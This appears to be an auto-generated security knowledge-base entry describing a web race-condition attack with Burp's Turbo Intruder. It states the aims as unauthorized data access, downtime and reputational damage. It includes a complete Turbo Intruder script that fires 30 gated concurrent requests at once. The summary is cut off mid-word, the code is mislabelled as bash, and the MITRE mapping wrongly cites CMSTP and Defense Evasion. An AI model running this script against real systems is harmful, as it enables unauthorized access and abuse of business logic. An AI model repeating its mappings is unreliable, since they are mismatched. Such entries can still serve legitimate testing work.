---
id: 6c7d8f4b-7a2e-45ce-b2bf-029a5aee9fb7
name: Race Condition Turbo Intruder Attack
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:31.886688+00:00'
updated_at: '2023-04-06T03:56:31.916192+00:00'
tactics:
- '[[Defense Evasion|TA0005 - Defense Evasion]]'
- '[[Execution|TA0002 - Execution]]'
- '[[Impact|TA0040 - Impact]]'
techniques:
- '[[CMSTP|T1191 - CMSTP]]'
- '[[Resource Hijacking|T1496 - Resource Hijacking]]'
tags:
- '[[Race Condition]]'
- '[[Turbo Intruder Examples]]'
commands:
- '[[Handle Response]]'
- '[[Queue Requests]]'
---

# Race Condition Turbo Intruder Attack

## Summary

A race condition is a vulnerability that occurs when multiple threads or processes access and manipulate the same resource concurrently, leading to unexpected behavior. In this case, the race condition occurs when multiple requests are sent to a server and the server processes them out of order. Th

## Description

# Description

A race condition is a vulnerability that occurs when multiple threads or processes access and manipulate the same resource concurrently, leading to unexpected behavior. In this case, the race condition occurs when multiple requests are sent to a server and the server processes them out of order. This can result in sensitive data being leaked or unauthorized access to resources. The Turbo Intruder tool can be used to automate this attack by queuing up a large number of requests and sending them simultaneously.

Technical Explanation: The attacker sends multiple requests to the server and the server processes them out of order, allowing the attacker to access sensitive data or resources. The Turbo Intruder tool automates this process by sending a large number of requests simultaneously.

Business Value: This attack can result in unauthorized access to sensitive data, such as customer information, financial data, or intellectual property. It can also lead to system downtime and damage to the organization's reputation.

## Requirements

1. Access to the target server

1. Turbo Intruder tool installed

## Defense

1. Implement proper access controls to limit the number of requests that can be sent to the server

1. Use rate limiting to prevent multiple requests from being processed simultaneously

1. Monitor server logs for unusual activity and implement alerting mechanisms

## Objectives

1. Gain unauthorized access to sensitive data or resources

1. Cause system downtime

1. Damage the organization's reputation

# Instructions

1. Fill in the 'target' and 'wordlists' parameters with the appropriate values. 'target' should have an 'endpoint' attribute and 'req' and 'baseInput' methods. 'wordlists' should be a list of wordlists to use in the requests.

**Code**: [[def queueRequests(target, wordlists):
    engine =]]

> This Python code can be used as a payload for the Turbo Intruder tool. It queues multiple requests with different parameters and starts the engine with a timeout of 5 seconds. It also opens a gate for race condition and completes the engine with a timeout of 60 seconds. The 'handleResponse' function adds the request to a table. The 'target' and 'wordlists' parameters need to be filled in with appropriate values for the code to work.

**Command** ([[Queue Requests]]):

```bash
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                        concurrentConnections=30,
                        requestsPerConnection=30,
                        pipeline=False
                        )

    # Queue multiple requests with different parameters
    for i in range(30):
        engine.queue(target.req, i)
        engine.queue(target.req, target.baseInput, gate='race1')

    # Start the engine and open gate for race condition
    engine.start(timeout=5)
    engine.openGate('race1')
    engine.complete(timeout=60)

```

**Command** ([[Handle Response]]):

```bash
def handleResponse(req, interesting):
    # Add request to table
    table.add(req)
```

## MITRE ATT&CK Mapping

### Tactics

- [[Defense Evasion|TA0005 - Defense Evasion]]
- [[Execution|TA0002 - Execution]]
- [[Impact|TA0040 - Impact]]

### Techniques

- [[CMSTP|T1191 - CMSTP]]
- [[Resource Hijacking|T1496 - Resource Hijacking]]

## Commands Used

- [[Handle Response]]
- [[Queue Requests]]

## Tags

- [[Race Condition]]
- [[Turbo Intruder Examples]]
